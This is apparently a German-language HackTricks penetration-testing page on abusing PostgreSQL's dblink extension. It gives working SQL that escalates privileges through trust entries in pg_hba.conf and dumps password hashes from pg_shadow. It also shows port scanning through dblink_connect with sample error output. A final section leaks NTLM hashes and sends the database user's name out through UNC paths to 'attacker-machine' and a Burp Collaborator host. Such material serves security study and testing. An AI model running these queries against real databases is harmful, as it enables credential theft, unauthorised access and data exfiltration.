{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}


**Finden Sie [weitere Informationen zu diesen Angriffen im Originalpapier](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**.

Seit **PostgreSQL 9.1** ist die Installation zus√§tzlicher Module einfach. [Registrierte Erweiterungen wie `dblink`](https://www.postgresql.org/docs/current/contrib.html) k√∂nnen mit [`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html) installiert werden:
```sql
CREATE EXTENSION dblink;
```
Sobald Sie dblink geladen haben, k√∂nnten Sie einige interessante Tricks ausf√ºhren:

## Privilegieneskalation

Die Datei `pg_hba.conf` k√∂nnte schlecht konfiguriert sein **und Verbindungen** von **localhost als beliebiger Benutzer** ohne Passwortkenntnis **erlauben**. Diese Datei befindet sich typischerweise in `/etc/postgresql/12/main/pg_hba.conf` und eine schlechte Konfiguration sieht so aus:
```
local    all    all    trust
```
_Beachten Sie, dass diese Konfiguration h√§ufig verwendet wird, um das Passwort eines DB-Benutzers zu √§ndern, wenn der Administrator es vergisst, sodass Sie es manchmal finden k√∂nnen._\
_Beachten Sie auch, dass die Datei pg\_hba.conf nur vom Benutzer und der Gruppe postgres lesbar und nur vom Benutzer postgres beschreibbar ist._

Dieser Fall ist **n√ºtzlich, wenn** Sie **bereits** eine **Shell** im Opfer haben, da Sie so eine Verbindung zur PostgreSQL-Datenbank herstellen k√∂nnen.

Eine weitere m√∂gliche Fehlkonfiguration besteht in etwas wie diesem:
```
host    all     all     127.0.0.1/32    trust
```
Da es jedem vom localhost erm√∂glicht, sich als beliebiger Benutzer mit der Datenbank zu verbinden.\
In diesem Fall und wenn die **`dblink`**-Funktion **funktioniert**, k√∂nnten Sie die **Berechtigungen erh√∂hen**, indem Sie sich √ºber eine bereits bestehende Verbindung mit der Datenbank verbinden und auf Daten zugreifen, auf die Sie nicht zugreifen sollten:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'SELECT datname FROM pg_database')
RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
user=postgres
dbname=postgres',
'select usename, passwd from pg_shadow')
RETURNS (result1 TEXT, result2 TEXT);
```
## Port Scanning

Durch den Missbrauch von `dblink_connect` k√∂nntest du auch **offene Ports suchen**. Wenn diese **Funktion nicht funktioniert, solltest du versuchen, `dblink_connect_u()` zu verwenden, da die Dokumentation besagt, dass `dblink_connect_u()` identisch mit `dblink_connect()` ist, mit dem Unterschied, dass es Nicht-Superusern erlaubt, sich mit jeder Authentifizierungsmethode zu verbinden_.
```sql
SELECT * FROM dblink_connect('host=216.58.212.238
port=443
user=name
password=secret
dbname=abc
connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
Is the server running on host "127.0.0.1" and accepting
TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```
Beachten Sie, dass Sie **bevor** Sie `dblink_connect` oder `dblink_connect_u` verwenden k√∂nnen, m√∂glicherweise Folgendes ausf√ºhren m√ºssen:
```
CREATE extension dblink;
```
## UNC-Pfad - NTLM-Hash-Offenlegung
```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```
{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
